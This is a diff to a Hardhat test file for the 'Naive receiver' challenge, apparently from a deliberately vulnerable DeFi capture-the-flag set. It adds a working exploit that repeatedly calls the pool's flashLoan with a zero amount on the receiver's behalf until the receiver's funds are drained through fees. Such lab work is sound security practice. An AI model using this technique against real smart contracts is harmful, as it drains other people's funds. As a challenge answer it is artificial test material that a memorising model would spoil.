@@ -30,7 +30,12 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+        let amountToLoan = ethers.utils.parseEther("0"); // This value can be anything (even zero) because the loan is effectively returned.
+        let fixedFee = await this.pool.fixedFee();
+        while ((await ethers.provider.getBalance(this.receiver.address)).gte(fixedFee)) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, amountToLoan);     
+        }
     });
 
     after(async function () {
